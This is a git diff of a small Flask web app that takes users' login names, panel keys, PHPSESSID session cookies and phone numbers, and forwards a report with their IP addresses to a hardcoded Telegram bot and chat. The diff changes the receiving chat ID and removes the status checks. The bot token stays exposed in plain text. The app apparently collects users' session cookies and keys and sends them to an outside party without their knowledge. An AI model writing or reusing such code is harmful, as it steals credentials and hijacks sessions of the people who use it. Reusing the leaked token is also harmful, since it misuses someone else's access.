@@ -3,7 +3,7 @@ import re
 from flask import Flask, request, render_template, redirect, url_for, session, flash
 import io
 app = Flask(__name__)
-app.secret_key = 'ٌRef@osamiSadky'  # Secret key for session management
+app.secret_key = 'your_secret_key'  # Secret key for session management
 
 # Dictionary to store multiple usernames and passwords
 USER_CREDENTIALS = {
@@ -110,7 +110,7 @@ USER_CREDENTIALS = {
 }
 
 # Telegram bot details
-TELEGRAM_CHAT_ID = '5946185802'
+TELEGRAM_CHAT_ID = '854578633'
 TELEGRAM_BOT_TOKEN = '7056070766:AAH84C0uxetDrxNNbpr9ZngZgVDq54BOQGI'
 
 def get_panel_code(KEY, PHPSESSID, NUMBER):
@@ -165,19 +165,12 @@ def send_file_to_telegram(report_content):
     
     # Convert the report content to a file-like object
     report_file = io.BytesIO(report_content.encode('utf-8'))
-    report_file.name = 'user_report.txt'  # Set a name for the file
 
-    files = {'document': report_file}
+    files = {'document': ('user_report.txt', report_file)}
     data = {'chat_id': TELEGRAM_CHAT_ID}
     
     # Send the file to Telegram
     response = requests.post(url, files=files, data=data)
-    
-    # Check for errors
-    if response.status_code == 200:
-        print("Report sent successfully!")
-    else:
-        print(f"Failed to send report. Status code: {response.status_code}")
 
 
 @app.route('/', methods=['GET', 'POST'])
@@ -194,7 +187,7 @@ def login():
         else:
             flash('Invalid username or password', 'danger')
 
-    return render_template('index.html')
+    return render_template('login.html')
 
 
 @app.route('/verification', methods=['GET', 'POST'])
@@ -219,9 +212,9 @@ def verification_code_finder():
         # Send the report to Telegram
         send_telegram_report(username, ip_address, key, phpsessid, numbers, results)
 
-        return render_template('input_data.html', results=results)
+        return render_template('verification.html', results=results)
 
-    return render_template('input_data.html')
+    return render_template('verification.html')
 
 
 @app.route('/logout')
